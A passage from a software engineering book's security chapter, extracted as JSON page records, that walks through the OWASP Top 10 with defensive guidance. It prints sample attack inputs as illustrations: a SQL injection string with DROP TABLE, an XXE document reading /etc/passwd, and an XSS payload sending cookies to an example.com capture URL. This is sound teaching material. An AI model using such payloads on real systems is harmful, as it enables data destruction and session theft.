      "content": "CHAPTER 11\n\nSecurity\n\nPoor security practices can damage your organization and many others. Your company may suffer direct losses from fraud or extortion. That damage gets multiplied by the cost of remediation, customer compensation, regulatory fines, and lost reputation. Individuals will lose their jobs, up to and including the CEO.1 In 2017, the “WannaCry” ransomware affected more than 70 countries. It hit office computers, subway displays, and hospitals. The UK’s National Health Service got hit particularly hard, causing X-ray sessions to be canceled, stroke centers to close, and surgeries to be postponed. It put lives at risk.2\n\nIn an epic game of one-upmanship, Equifax revealed in 2017 that 145.5 million US consumers’ identities had been stolen.3 And Yahoo! upped the ante in the same year when they announced that 3 billion Yahoo! accounts were stolen. We may have to discover alien life to get another order of magnitude increase.\n\nSystem breaches aren’t always about extracting data. Sometimes they are about implanting it, as in the case of false identities or shipping documents. That kind of effort may have contributed to California’s nut theft crisis in 2013.4\n\nSecurity must be baked in. It’s not a seasoning to sprinkle onto your system at the end. Even if your company has a dedicated security team, you aren’t off the hook. You’re still responsible to protect your customers and your company.\n\n1. 2.\n\nhttp://wapo.st/1juGxSu\n\nhttps://eandt.theiet.org/content/articles/2017/05/wannacry-and-ransomware-impact-on-patient-care-could-cause-\n\nfatalities\n\n3. 4.\n\nhttps://en.wikipedia.org/wiki/Equifax#May.E2.80.93July_2017_security_breach\n\nwww.outsideonline.com/2186526/nut-job\n\nreport erratum • discuss",
      "content_length": 1722,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 224,
      "content": "Chapter 11. Security • 216\n\nIn this chapter, we’ll look at the “top ten” list of application vulnerabilities, as identified by the Open Web Application Security Project (OWASP). We’ll also consider data protection and integrity so that nobody loses their valuable nuts.\n\nThe OWASP Top 10\n\nSince 2001, the OWASP Foundation has catalogued application security incidents and vulnerabilities.5 Its member organizations contribute data from real attacks, so these are real lessons rather than “what-if-isms.” One way that OWASP promotes application security awareness is through its OWASP Top 10 list. It represents a consensus about the most critical web application security flaws, updated every three or four years. OWASP plans to release an updated and revised list in 2017. There’s still considerable debate, so the list here (based on “Release Candidate 1”) may not be the one that gets adopted. For that matter, it might actually turn out to be the 2018 update. It just goes to show that you can’t ever stop worrying about security.\n\nThis section will discuss the Top 10 in brief. It would still be good to go read the whole document. (Be warned, though; you may not want to put anything on the Net ever again!)\n\nInjection\n\n“Injection” is an attack on a parser or interpreter that relies on user-supplied input. The classic example is SQL injection, where ordinary user input is crafted to turn one SQL statement into more than one. This is the “Little Bobby Tables” attack.6 In that classic XKCD strip, a school administrator asks if the character’s son is really named “Robert’); DROP TABLE Students;- -”. While an odd moniker, Bobby Tables illustrates a typical SQL injection attack. If the application con- catenates strings to make its query, then the database will see an early sequence of '); to terminate whatever query the application really meant to do. The next thing is the destructive DROP TABLE statement that does the dirty deed. The double-hyphen at the end indicates a comment so the database will ignore the remainder of the input (whatever was left over from the original query).\n\nThere’s no excuse for SQL injections in this day and age. It happens when code bashes strings together to make queries. But every SQL library allows the use of placeholders in query strings. Don’t do this:\n\n// Vulnerable to injection String query = \"SELECT * FROM STUDENT WHERE NAME = '\" + name + \"';\"\n\n5. 6.\n\nwww.owasp.org\n\nhttp://bobby-tables.com\n\nreport erratum • discuss",
      "content_length": 2476,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 225,
      "content": "The OWASP Top 10 • 217\n\nInstead do this:\n\n// Better String query = \"SELECT * FROM STUDENT WHERE NAME = ?;\" PreparedStatement stmt = connection.prepareStatement(query); stmt.setString(1, name); ResultSet results = stmt.executeQuery();\n\nFor more defenses, see the OWASP SQL Injection Prevention Cheat Sheet.7\n\nOther databases are also vulnerable to injection attacks. In general, if a service builds queries by bashing strings together and any of those strings come from a user, that service is vulnerable. Keep in mind that “comes from a user” doesn’t only mean the input arrived just now in an HTTP request. Data from a database may have originated from a user as well.\n\nAnother common vector for injection attacks is XML. XML may not be the cool kid on the block anymore, but there’s a lot of it flying around on the wires. One XML-based attack is the XML external entity (XXE) injection. You’re no doubt familiar with the built-in XML entities such as &amp; and &lt;. But did you know that XML allows any document to define new entities? Most of the time that’s just used to make shortcuts for commonly referenced tags or attributes. But documents can also specify “external entities” in the document type declaration (DTD). These act like “include” statements. An XML parser will replace occurrences of the external entity with whatever it receives from the associated URL. An “external entity” looks like this:\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n\nThis oddly shaped bit of XML first defines an inline DTD with the “DOCTYPE” processing instruction. The DTD defines two things. First, it says there’s a tag “foo” that can contain anything. Next it defines an entity “xxe” whose contents are found by reading the URL file:///etc/passwd.\n\nAn attacker would submit this document to an exposed API. Obviously it’s not going to do anything useful with that API. Instead the attacker hopes that the error response from the endpoint will contain the offending input, with the external entity expanded.\n\nMost XML parsers are vulnerable to XXE injection by default. You need to configure them to be safe. No, the answer is not to parse the XML yourself\n\n7.\n\nwww.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet\n\nreport erratum • discuss",
      "content_length": 2343,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 226,
      "content": "Chapter 11. Security • 218\n\nwith regular expressions! Just use the OWASP XXE Prevention Cheat Sheet to configure your parser for safety.8\n\nSQL injection and XXE are just two of the many ways user input can corrupt your service. Format string attacks, “Eval injection,” XPATH injection...Injec- tion attacks have held their top spot on the OWASP Top 10 since 2010. Before that they were number two. Don’t let yourself fall prey.\n\nBroken Authentication and Session Management\n\nAuthentication and session management covers a myriad of problems. It can be as obvious as putting a session ID into URLs or as subtle as storing unsalted passwords in your user database. (If your user database stores passwords without hashing or encrypting them, please stop reading now and go fix that.) Let’s look at some of the top offenders.\n\nThe first place to look is with session identifiers in web front ends. At one time, it was common to use query parameters on URLs and hyperlinks to carry session IDs. Not only are those session IDs visible to every switch, router, and proxy server, they are also visible to humans. Anyone who copies and pastes a link from his or her browser inadvertently shares his or her session with email recipients and chat bots.\n\nAn electronics retailer once had a spectacular outage when a special-offer email went out to many thousands of people. The email included a deep link to the product page, including the marketer’s session ID. Thousands of random users tried to use that same session. The outage resulted from each of the front-end servers trying to take exclusive ownership of that session.\n\nThe general term for this is “session hijacking” (as opposed to truck hijacking). In the retailer’s case, it was self-inflicted. But any session ID in plain text can be sniffed and duplicated by an attacker. The attacker gains control of the user’s session. If we’re lucky, only that user is affected and may be the victim of identity theft or fraud. If we are unlucky, the hijacked session may belong to an administrator working through a web GUI.\n\nSession hijacking is easiest when the session ID is so visible. It can still happen, however, even if the session ID is embedded in a cookie. Sessions can also be compromised via cross-site scripting (XSS) attacks, which we’ll look at a little bit later.\n\nA variant of session hijacking is “session fixation.” An attacker goes to the vulnerable application and gets issued a valid session ID. The attacker then\n\n8.\n\nhttps://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet\n\nreport erratum • discuss",
      "content_length": 2589,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 227,
      "content": "The OWASP Top 10 • 219\n\nsupplies the target with a link to the application with the attacker’s session ID in it. (It may be provided to the victim several ways, including client-side script or the META tag to set a cookie.) The receiving application accepts the session ID from the victim and generates a response within that session. From this point on, the victim uses a session that the attacker can access at any time. The attacker expects the user to authenticate the session, which grants both the victim and the attacker full access.\n\nIf your session IDs are generated by any kind of predictable process, then your service may also be vulnerable to a “session prediction” attack. This occurs when an attacker can guess or compute a session ID for a user. Any session IDs based on the user’s own data are definitely at risk. Sequential session IDs are the absolute worst choice here. Just because a session ID looks random doesn’t mean that it is random, though. It may be predictable but not sequential. Any algorithm used by the server that generates the ID is probably open source and available for the attacker to download too.\n\nOWASP suggests the following guidelines for handling session IDs:\n\nUse a long session ID with lots of entropy.\n\nGenerate session IDs using a pseudorandom number generator (PRNG) with good cryptographic properties. Your language’s built-in rand() function probably isn’t it.\n\nProtect against XSS to avoid script execution that would reveal session IDs.\n\nWhen a user authenticates, generate a fresh session ID. That way, if a session fixation attack occurs, the attacker will not have access to the user’s account.\n\nUse the session management features built into your platform. They’ve already been hardened against many of these attacks. But keep up-to- date with security patches and versions. Too many systems run outdated versions with known vulnerabilities.\n\nUse cookies to exchange session IDs. Do not accept session IDs via other mechanisms. Some servers will emit session IDs in cookies but still accept them via query parameters. Disable that.\n\nWhen it comes to credentials, the most common problem is still the simplest: credentials sent in the clear. This originates from two toxic development practices. First, TLS certificates have been hard to use and easy to install incorrectly. That means most developers have never dealt with certificates or certificate chains in a production server. There are too many formats and too\n\nreport erratum • discuss",
      "content_length": 2500,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 228,
      "content": "Chapter 11. Security • 220\n\nmany “mysterious” problems. Second, most developer tools and runtimes leave it up to the user to configure a trust store. (Be honest, could you write a cURL command for a TLS-secured call to a development server using a self- signed certificate?) Consequently, we often write web services that use HTTP instead of HTTPS.\n\nHope is in the air, though. Let’s Encrypt has some promise to make certificates easier to acquire and use in web servers. Cloud and PaaS players are building certificate management and TLS into their platform.\n\nLarge enterprises may roll out a Kerberos-based system, bridged to their active directory services. If that sentence meant anything to you, then congratulations! You are in the top 10 percent of security-aware developers! (Have an almond! Unless you’re allergic, of course.) For the most part, one or two people will figure out a recipe to make this work in your world, and then everyone else will copy and paste the code that makes the security infrastructure happy.\n\n“Authentication” means we verify the identity of the caller. Is the caller who he or she claims to be? That may be a person in the case of a user-facing application. For an external API, it may be another company. Internal services need to authenticate their callers. In the old world, we used the “pie crust” defense. You had to authenticate to cross a boundary, but services inside the “pie” could call each other freely. Boundaries are much less clear today, so we need to think about authentication everywhere. Don’t trust calls based on their originating IP addresses, because those can be faked.\n\nLet’s start with the basics. Here are some do’s and don’ts:\n\nDon’t keep passwords in your database.\n\nNever email a password to a user as part of a “forgotten password” process.\n\nDo apply a strong hash algorithm to passwords. Use “salt,” which is some random data added to the password to make dictionary attacks harder.\n\nDo allow users to enter overly long passwords.\n\nDo allow users to paste passwords into GUIs.\n\nDo plan on rehashing passwords at some point in the future. We have to keep increasing the strength of our hash algorithms. Make sure you can change the salt, too.\n\nDon’t allow attackers to make unlimited authentication attempts.\n\nOne side note about the number of authentication attempts you allow: people instinctively want to limit this to three attempts before locking an account.\n\nreport erratum • discuss",
      "content_length": 2458,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 229,
      "content": "The OWASP Top 10 • 221\n\nThe trouble is that most of us have multiple devices with applications that can automatically retry authentication several times. It’s not very friendly to lock out users because they changed their password via the web interface but your mobile app kept trying to log them in with an old password.\n\nAuthentication may be first-party or third-party. In first-party authentication, the authority (us) keeps a database of credentials. The principal (the caller who claims to have an identity) provides credentials that the authority checks against its database. If the credentials match, the authority accepts that identity for the principal.\n\nIn third-party authentication, the principal presents a “proof” that it acquired from some other authority. Our system can check that proof to verify that it could only have been issued by the authority. Of course, this relies on some exchange of secret information in advance that we can use to confirm the proof. For example, our service may have the public half of a keypair that the authority uses to sign its proofs. A second but equally important thing to check is that the proof wasn’t intercepted and used by an attacker. Kerberos, NTLM, and OAuth are all third-party authentication systems.\n\nCross-Site Scripting\n\nCross-site scripting (XSS) happens when a service renders a user’s input directly into HTML without applying input escaping. It’s related to injection attacks. Both take advantage of the fact that we represent structured data as sequences of ordinary characters by providing premature delimiters and unwanted commands. For example, suppose we have a service that echoes back the user’s “search” parameter in the results page. It has some server- side rendering code like this:\n\n// Don't do this. String queryBox = \"<input type='text' value='\" + request.getParameter(\"search\") + \"' />\";\n\n// XSS happens here.\n\nAn attacker can run a search with this nasty little query string (wrapped to fit the page):\n\n'><script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'\n\nAfter the server inserts that string, the resulting HTML looks like this (wrapped to fit the page):\n\n<input type='text' value=''> <script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'' />\n\nreport erratum • discuss",
      "content_length": 2332,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 230,
      "content": "Chapter 11. Security • 222\n\nThis is malformed HTML to be sure, but browsers are pretty lenient about that. When the client’s browser hits the script tag in the middle, it makes a request over to www.example.com with the user’s cookie as a parameter, allowing the attacker to hijack the user’s session.\n\nThis isn’t just a problem with server-side rendering. Lots of front-end apps make service calls and put the content straight into the DOM without escaping. These clients are just as vulnerable to XSS.\n\nA whole class of injection attacks aim at administrator or customer service GUIs. These attacks work through the browser. For example, a customer may fill out a “contact us” form with a bunch of hostile data with embedded JavaScript. When a high-authorization user pulls up that record, the Java- Script executes on the administrator’s browser. It might be hours, days, or weeks later. Some injection attacks have targeted log viewers. These work by putting hostile data in log strings. If the log viewer doesn’t apply good HTML escaping, it will execute code with the privileges of the user running the viewer (often an admin).\n\nAutomated scanning tools will find XSS flaws quickly. They submit forms with quasi-random data to see when it gets echoed to an output page without escaping. Expect an exploit within milliseconds.\n\nXSS can be used to conscript your system into attacking others. The attacker injects script into your system, which then executes on your users’ browsers to attack a different party entirely. Herd immunity is vital to stopping XSS.\n\nThe bottom line is this: never trust input. Scrub it on the way in and escape it on the way out. Java developers should use OWASP’s Java Encoder Project.9 And everyone should read the XSS Prevention Cheat Sheet.10\n\nA secondary lesson is this: don’t build structured data by smashing strings together. Look for an HTML generation library that automatically escapes everything and forces you to ask nicely to do unsafe things.\n\nBroken Access Control\n\nBroken access control refers to application problems that allow attackers to access data they shouldn’t. This can include other users’ data or system- level data like password files.\n\n9. 10. www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet\n\nwww.owasp.org/index.php/OWASP_Java_Encoder_Project\n\nreport erratum • discuss",
      "content_length": 2357,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 231,
      "content": "The OWASP Top 10 • 223\n\nOne of the common forms of broken access control is “direct object access.” This happens when a URL includes something like a database ID as a query parameter. An attacker sees the ID in the query parameter and starts probing for other numbers. Since database IDs are assigned sequentially, it’s easy for an attacker to scan for other interesting data. For example, suppose a ware- house management system uses the customer’s ID to display a report of shipments. An attacker can start trying other customer IDs to see what goods are en route.\n\nThe solution has two parts: reducing the value of URL probing and checking authorization to objects in the first place.\n\nDeter URL Probing\n\nWe can make it harder to find interesting values. First, don’t use database IDs in URLs. We can generate unique but non-sequential identifiers to use in URLs. In that case, an attacker can probe the ID space but will have low odds of finding interesting results.\n\nAnother approach is to use a generic URL that is session-sensitive. For instance, instead of http://www.example.com/users/1023, use http://www.example.com/users/me. An attacker may try a lot of values in place of “me” but won’t be able to see anyone else’s private data.\n\nYet another approach is to use a session-specific mapping from random IDs to real IDs. This uses more memory, but it avoids the extra storage needed for randomized IDs. When a user makes a request for http://www.example.com/pro- files/1990523, the service looks up that number in the session-scoped map. If it exists, the service can fetch the underlying object (probably from cache). If it doesn’t exist, then the service returns a 404. This prevents attackers from probing for other users’ data. One downside is that the service must populate all response URLs with randomly assigned identifiers. A second downside is that links will not persist across sessions. This violates REST principles.\n\nAuthorize Access to Objects\n\nThe underlying reason direct object access problems happen is that our ser- vices confuse “possesses a URL” with “allowed to access resource.” Callers may possess many URLs from sniffing, phishing, or probing that they should not be allowed to access.\n\nIf a resource should only be sent to authorized callers, your service must make that check on every request. You may think that a URL could only be generated by a secure service, but that’s never the case. URLs are just text strings, and anybody can create whatever URL they like!\n\nreport erratum • discuss",
      "content_length": 2529,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 232,
      "content": "Chapter 11. Security • 224\n\nThere’s a subtle error that often causes information leakage here. Suppose your service responds with a “404 Not Found” when a caller requests a resource that doesn’t exist, but responds with a “403 Authentication Required” for a resource that exists but isn’t authorized. That means your service leaks information about what resources exist or not. That may not seem like much, but it could be. Suppose the resources in question are customers by ID. Then an attacker could find out how many customers you have by making requests for customer 1, 2, 3, and so on. When the response changes from 403 to 404, they’ve found the size of your customer base. It might be very interesting to see that number change from month to month.\n\nOr, an attacker could probe your login service with different email addresses harvested from the web. A 403 means “yes, that’s my customer,” where a 404 means “never heard of them.”\n\nRule of thumb: If a caller is not authorized to see the contents of a resource, it should be as if the resource doesn’t even exist.\n\nAnother kind of broken access control leads to directory traversal attacks. This happens whenever a caller provides input that’s used to construct a file name. The caller supplies a parameter with one or more ../ strings (for Unix systems) or ..\\ (for Windows.) The service concatenates that with some base directory and ends up opening a file outside the expected location (string concatenation again!). With just a few requests, a caller can find a way to the password file on the host.\n\nEven worse, when a request involves a file upload, the caller can overwrite any file the service is allowed to modify. (Yet another reason to not run as root!) Your application might think it’s saving the user’s profile picture, but it actually writes a malicious executable into the filesystem.\n\nThe only safe way to handle file uploads is to treat the client’s filename as an arbitrary string to store in a database field. Don’t build a path from the file- name in the request. Generate a unique, random key for the real filename and link it to the user-specified name in the database. That way, the names in the filesystem stay under your service’s control and don’t include external input as any part.\n\nDirectory traversals can be subtle and hard to scrub out of input. The entry for Common Weakness Enumeration 22 shows several failed attempts to protect against traversal.11 Fortunately, it also shows how to prevent it.\n\n11. http://cwe.mitre.org/data/definitions/22.html\n\nreport erratum • discuss",
      "content_length": 2566,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 233,
      "content": "The OWASP Top 10 • 225\n\nSecurity Misconfiguration\n\nHow many times have you typed “admin/admin” as a login? It may seem ridiculous, but default passwords are a serious problem. Attackers have entered applications, network devices, and databases by using the default, out-of-the-box admin login. This is just one kind of security misconfiguration.\n\nSecurity misconfiguration usually takes the form of omission. Servers enable unneeded features by default. We forget (or don’t know) to disable them and thereby leave an unconfigured, unmonitored entry point open.\n\nAdmin consoles are a common source of problems. Seek them out and force good password hygiene. Never allow a default password on a production server. Cast a wary eye on containers, especially if you’re building on an image that includes applications. Base OS images shouldn’t have servers running, but common bundles include servers like Redis, Mongo, Postgres, ZooKeeper, and so on. These have their own authentication mechanisms and default admin passwords.\n\nThe whole world got a vivid wake-up call in the early days of 2017, when somewhere north of 20,000 MongoDB installations were taken hostage. The databases had default credentials and were exposed to the Internet. Attackers took the data, wiped the database out, and replaced it with a demand for bitcoin. (Note that MongoDB, the company, has a thorough guide for securing the database;12 it’s unfortunate that the default installation at the time was not secured.) Remember the install script is the first step in installation, not the last.\n\nAnother common security misconfiguration relates to servers listening too broadly. We first encountered this in Programming for Multiple Networks, on page 145. You can improve information security right away by splitting internal traffic onto its own NIC separate from public-facing traffic. Security profes- sionals talk about the “attack surface,” meaning the sum of all IP addresses, ports, and protocols reachable to attackers. Split those admin interfaces to reduce the attack surface. This is especially easy in cloud environments, where another interface is just an API call away.\n\nSome servers come with sample applications that have shockingly poor security protection and may be ages out of date. There’s never a reason to put a sample application into production. Nevertheless, it happens. Once there, the sample apps are never patched. They’re part of the exposed attack surface. Sample apps are well known and easy to find in the wild. It’s easy to build an attack for flaws in those sample apps.\n\n12. www.mongodb.com/blog/post/how-to-avoid-a-malicious-attack-that-ransoms-your-data\n\nreport erratum • discuss",
      "content_length": 2687,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 234,
      "content": "Chapter 11. Security • 226\n\nFinally, make sure every administrator uses a personal account, not a group account. While you’re at it, go ahead and add some logging to those adminis- trative and internal calls. If nothing else, you’ll be one of the few people to witness a smiling auditor.\n\nSensitive Data Exposure\n\nThis is the big one. Credit cards (Equifax!). Medical records. Insurance files. Purchasing data. Emails (Yahoo!). All the valuable things people can steal from you or use against you. The stuff that makes for headlines and subpoe- nas. That’s what OWASP means by “sensitive data.” The “exposure” part is probably obvious.\n\nExposure doesn’t mean that a hacker broke your crypto. Hackers don’t attack your strong points. They look for cracks in your shell. It can be as simple as an employee’s stolen laptop with a database extract in a spreadsheet. Maybe your system uses TLS at the edge but REST over plain HTTP internally— another “pie crust.” An attacker can sniff the network to collect credentials and payload data.\n\nHere are some guidelines to help you avoid headlines:\n\nDon’t store sensitive information that you don’t need. In retail, use a\n\ncredit card tokenizer from your payment provider.\n\nUse HTTP Strict Transport Security. This is a step beyond HTTPS-first.\n\nIt prevents clients from negotiating their way to insecure protocols.\n\nStop using SHA-1. Just stop. It’s no longer adequate.\n\nNever store passwords in plain text. Read OWASP’s Password Storage Cheat Sheet for guidance on hash algorithms and good salting.13\n\nMake sure sensitive data is encrypted in the database. It’s a pain, but\n\nnecessary.\n\nDecrypt data based on the user’s authorization, not the server’s.\n\nIf you are in the AWS cloud, consider using AWS Key Management Service (KMS).14 KMS creates and manages master keys. Applications can request data encryption keys, which they use to encrypt or decrypt data. The data encryption keys are themselves encrypted with a “key encryption key.” It gets kind of recursive, but the point is that you don’t leave decryption keys laying\n\n13. www.owasp.org/index.php/Password_Storage_Cheat_Sheet 14. http://docs.aws.amazon.com/kms/latest/developerguide/concepts.html\n\nreport erratum • discuss",
      "content_length": 2224,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 235,
      "content": "The OWASP Top 10 • 227\n\naround where an attacker could retrieve them. If you’re running on your own premises, consider HashiCorp’s Vault.15 It manages “secrets” a bit more broadly than KMS.\n\nRegardless of which tool you pick, don’t try to hold it at arm’s length. Use the tool fully as part of a holistic secure development process.\n\nInsufficient Attack Protection\n\nConsider a production service protected by a firewall. It should be safe from attackers. Sadly, that is not the case. We must always assume that attackers have unlimited access to other machines behind the firewall. They can make arbitrary requests. That includes well-formed requests for unauthorized data, and it includes malformed requests aimed at compro- mising the service itself.\n\nServices do not typically track illegitimate requests by their origin. They do not block callers that issue too many bad requests. That allows an attacking program to keep making calls, either to probe for weaknesses or extract data.\n\nYour service probably detects bad input and rejects it like a closed pistachio. That leaves the attacker free to keep issuing requests. The service should log bad requests by source principal. Log collection tools, which we covered in Logs and Stats, on page 204, can collate those requests to find patterns.\n\nIt’s probably not feasible to give every service a whitelist of allowed consumers. After all, we want consumers to be deployed on their own, without centralized control. We can, however, give a service a blacklist of disallowed consumers. This may be stored as a certificate revocation list (CRL) or by principal name in your authentication system (Active Directory name, for example).\n\n“API Gateways” are a useful defense here. An API gateway can block callers by their API key. It can also throttle their request rate. Normally, this helps preserve capacity. In the case of an attack, it slows the rate of data compro- mise, thereby limiting the damage.\n\nNetwork devices may help if your service is in a data center under your control. Application-layer firewalls (also called “layer 7” firewalls) can detect and block suspicious calls. They can also be loaded with signatures of well-known attacks to block probes.\n\n15. www.vaultproject.io\n\nreport erratum • discuss",
      "content_length": 2267,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 236,
      "content": "Chapter 11. Security • 228\n\nCross-Site Request Forgery\n\nCross-site request forgery (CSRF) used to be a bigger issue than it is now. These days, most web frameworks automatically include defenses against it. But a lot of old applications are out there. Some are vulnerable targets, while others can be used as stooges.\n\nA CSRF attack starts on another site. An attacker uses a web page with JavaScript, CSS, or HTML that includes a link to your system. When the hapless user’s browser accesses your system, your system thinks it’s a valid request from that user. Boom, your user is roasted. Note that the user’s browser will send all the usual cookies, including session cookies. Just because the user appears to have a logged-in session doesn’t mean the request is intentional.\n\nThe first thing to do is make sure your site can’t be used to launch CSRF attacks. XSS is a common trap. If the attacker can supply input that you display without proper escaping, the attacker can trick people into viewing it through your site. Don’t be a part of it!\n\nSecond, make sure that requests with side effects—such as password changes, mailing address updates, or purchases—use anti-CSRF tokens. These are extra fields containing random data that your system emits when rendering a form. Your code expects get the same token back when the user submits the form. If the token is missing or doesn’t match, it means the request is bogus. Most frameworks today do this for you, but you might have to enable CSRF protection in your service’s configuration.\n\nYou can also tighten up your cookie policy with the relatively new “SameSite” attribute.16 A cookie with that attribute looks like this in a response header:\n\nSet-Cookie: SID=31d4d96e407aad42; SameSite=strict\n\nThe “SameSite” attribute causes the browser to send the cookie only if the document’s origin is the same as the target’s origin. That includes subdo- mains, so same-site cookies for “account.example.com” would not be sent to “images.example.com.” Not every browser supports same-site cookies as of June 2017. The Chrome family supports it on desktop and mobile. Opera does as well, but Firefox, Internet Explorer, and Edge do not. Keep an eye on the Can I Use... website to see when your supported browsers have this feature.17\n\n16. https://tools.ietf.org/html/draft-west-first-party-cookies-06 17. http://caniuse.com/#feat=same-site-cookie-attribute\n\nreport erratum • discuss",
      "content_length": 2427,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 237,
      "content": "The OWASP Top 10 • 229\n\nSame-site cookies are not a zero-cost feature. In particular, they may require you to change your session management approach. A top-level navigation request (an in-bound link from another system) on a new page is not a same- site request when the cookie says “strict.”\n\nThe RFC recommends using a pair of cookies:\n\nA session “read” cookie: not same-site. Allows HTTP GET requests. • A session “write” cookie: same-site strict. Required for state-changing requests.\n\nAs with the other Top 10 items, OWASP has a cheat sheet for CSRF prevention.18\n\nUsing Components with Known Vulnerabilities\n\nIs there anyone out there running Struts 2 between version 2.3.0 and 2.3.32 or 2.5.x before 2.5.10.1? Beware of an attack that allows remote code execu- tion.19 That’s what got Equifax. Once you know that vulnerability exists, it should just be a matter of updating to a patched version and redeploying. But who keeps track of the patch level of all their dependencies? Most devel- opers don’t even know what all is in their dependency tree.\n\nSadly, most successful attacks are not the exciting “zero day, rush to patch before they get it” kind of thing that makes those cringe-worthy scenes in big budget thrillers. Most attacks are mundane. A workbench-style tool probes IP addresses for hundreds of vulnerabilities, some of them truly ancient. The attacker may just collect an inventory of targets and weaknesses, or they may run automated exploits to add the machine to a growing collection of compro- mised minions.\n\nIt’s important to keep applications up-to-date. That means coming to grips with your dependency tree. Use your build tool to extract a report of all the artifacts that went into your build. (Don’t forget about plugins to the build tool itself! They can also have vulnerabilities.) Keep that report someplace and check it once a week against the latest CVEs. Better yet, use a build tool plugin that automatically breaks the build if there’s a CVE against any of your dependencies.20 If that’s too much work, you can sign up for a commercial service like VersionEye.21\n\n18. www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 19. https://nvd.nist.gov/vuln/detail/CVE-2017-5638 20. https://www.owasp.org/index.php/OWASP_Dependency_Check 21. https://www.versioneye.com/\n\nreport erratum • discuss",
      "content_length": 2359,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 238,
      "content": "Chapter 11. Security • 230\n\nMany vulnerabilities never get published, though. Some are discussed on the project’s mailing list or issue tracker but do not get CVEs, so you should keep an eye on those as well.\n\nUnderprotected APIs\n\nThe final entry in the Top 10 is also a newcomer to the list. The rise of REST and rich clients elevated APIs to a primary architectural concern. For some companies, the API is their entire product. It’s essential to make sure that APIs are not misused.\n\nSecurity scanners have been slow to tackle APIs. In part, this is because there’s no standard metadata description about how an API should work. That makes it hard for a testing tool to glean any information about it. After all, if you can’t tell how it should work, how do you know when it’s broken?\n\nTo make things even harder, APIs are meant to be used by programs. Well, attack tools are also programs. If an attack tool presents the right credentials and access tokens, it’s indistinguishable from a legitimate user.\n\nThere are several keys to defense.\n\nThe first is a kind of bulkheading (see Bulkheads, on page 98). If one cus- tomer’s credentials are stolen, that’s bad. If the attacker can use those to get other customers’ data, that’s catastrophic. APIs must ensure that malicious requests cannot access data the original user would not be able to see. That sounds easy, but it’s trickier than you might think. For instance, your API absolutely cannot use hyperlinks as a security measure. In other words, your API may generate a link to a resource as a way to say “access is granted” to that resource. But nothing says the client is only going to hit that link. It may issue 10,000 requests to figure out your URL templating pattern and then generate requests for every possible user ID. The upshot is that the API has to authorize the link on the way out and then reauthorize the request that comes back in.\n\nSecond, your API should use the most secure means available to communicate. For public-facing APIs this means TLS. Be sure to configure it to reject protocol downgrades. Also keep your root certificate authority (CA) files up-to-date. Bad actors compromise certificates way more often than you might think. For business-to-business APIs, you might want to use bidirectional certificates so each end verifies the other.\n\nThird, whatever data parser you use—be it JSON, YAML, XML, Transit, EDN, Avro, Protobufs, or Morse code—make sure the parser is hardened against\n\nreport erratum • discuss",
      "content_length": 2498,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 239,
      "content": "The Principle of Least Privilege • 231\n\nmalicious input. Use a generative testing library to feed it tons and tons of bogus input to make sure it rejects the input or fails in a safe way. Fuzz- testing APIs is especially important because, by their nature, they respond as quickly as possible to as many requests as possible. That makes them savory targets for automated crackers.\n\nThe Principle of Least Privilege\n\nThe principle of “least privilege” mandates that a process should have the lowest level of privilege needed to accomplish its task. This never includes running as root (UNIX/Linux) or administrator (Windows). Anything applica- tion services need to do, they should do as nonadministrative users.\n\nI’ve seen Windows servers left logged in as administrator for weeks at a time —with remote desktop access—because some ancient piece of vendor software required it. (This particular package also was not able to run as a Windows service, so it was essentially just a Windows desktop application left running for a long time. That is not production ready!)\n\nSoftware that runs as root is automatically a target. Any vulnerability in root- level software automatically becomes a critical issue. Once an attacker has cracked the shell to get root access, the only way to be sure the server is safe is to reformat and reinstall.\n\nTo further contain vulnerabilities, each major application should have its own user. The “Apache” user shouldn’t have any access to the “Postgres” user, for example.\n\nOpening a socket on a port below 1024 is the only thing that a UNIX applica- tion might require root privilege for. Web servers often want to open port 80 by default. But a web server sitting behind a load balancer (see Load Balancing, on page 177) can use any port.\n\nContainers and Least Privilege\n\nContainers provide a nice degree of isolation from each other. Instead of cre- ating multiple application-specific users on the host operating system, you can package each application into its own container. Then the host kernel will keep the containerized applications out of each others’ filesystems. That’s helpful for reducing the containers’ level of privilege.\n\nBe careful, though. People often start with a container image that includes most of an operating system. Some containerized applications run a whole init system inside the container, allowing multiple shells and processes. At that point, the container has its own fairly large attack surface. It must be\n\nreport erratum • discuss",
      "content_length": 2502,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 240,
